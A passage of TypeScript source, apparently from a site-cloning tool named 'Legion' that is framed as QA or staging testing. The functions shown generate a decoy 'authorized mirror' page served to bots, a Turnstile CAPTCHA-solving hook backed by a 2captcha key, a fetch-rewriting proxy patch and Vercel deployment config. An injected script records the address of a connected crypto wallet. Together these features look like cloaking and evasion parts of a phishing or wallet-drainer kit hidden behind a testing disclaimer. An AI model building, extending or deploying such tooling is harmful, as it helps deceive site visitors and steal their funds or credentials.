  document.addEventListener('legion-training-wallet-connected', function (ev) {
    if (ev.detail && ev.detail.address) window.__legionTrainingWallet = ev.detail.address;
  });
})();
`
}

export function buildBotsHtml(target: URL): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="robots" content="noindex,nofollow" />
  <title>QA staging mirror — informational</title>
  <style>
    body { font-family: system-ui, sans-serif; max-width: 640px; margin: 48px auto; padding: 0 24px; color: #334155; }
    h1 { font-size: 1.25rem; }
  </style>
</head>
<body>
  <h1>Authorized QA / staging mirror</h1>
  <p>This host mirrors <strong>${target.hostname}</strong> for internal user-experience and security research testing only.</p>
  <p>Reference origin: <code>${target.origin}</code></p>
  <p>Not affiliated with the original site operator. No indexing intended.</p>
</body>
</html>
`
}

export function buildTurnstileSolverReadme(): string {
  return `## --solve-captcha

When \`TWOCAPTCHA_API_KEY\` is set at generation time, the injected bundle exposes:

\`\`\`js
await window.__legionSolveTurnstile(siteKey, pageUrl)
\`\`\`

Use only in automated staging tests against targets you are authorized to test.
`
}

export function buildProxyClientPatch(target: URL): string {
  return `/* Legion QA — proxy mode fetch patch (staging) */
(function () {
  var ORIGIN = ${JSON.stringify(target.origin)};
  if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
    var origFetch = window.fetch;
    window.fetch = function (input, init) {
      var url = typeof input === 'string' ? input : (input && input.url);
      if (url && url.indexOf(ORIGIN) === 0) {
        var rel = url.slice(ORIGIN.length) || '/';
        return origFetch(rel, init);
      }
      return origFetch(input, init);
    };
  }
})();
`
}

export function buildVercelJson(): string {
  return JSON.stringify(
    {
      version: 2,
      builds: [{ src: '**', use: '@vercel/static' }],
      routes: [{ src: '/(.*)', dest: '/$1' }],
    },
    null,
    2,
  )
}

export function buildFeaturesReadme(ctx: TrainingCloneContext, enabled: string[]): string {
  const lines = [
    '## Enabled QA flags',
    '',
    ...enabled.map((f) => `- \`${f}\``),
    '',
    `Target: ${ctx.target.href}`,
    `Demo API: ${ctx.demoApiUrl}`,
    '',
  ]
  if (ctx.features.proxy) {
    lines.push('### Proxy mode', '', '```bash', 'docker compose up', '# open http://localhost:8080', '```', '')
  }
  if (ctx.features.rotate) lines.push(buildRotateReadme(), '')
  if (ctx.features.solveCaptcha) lines.push(buildTurnstileSolverReadme(), '')
  return lines.join('\n')
}
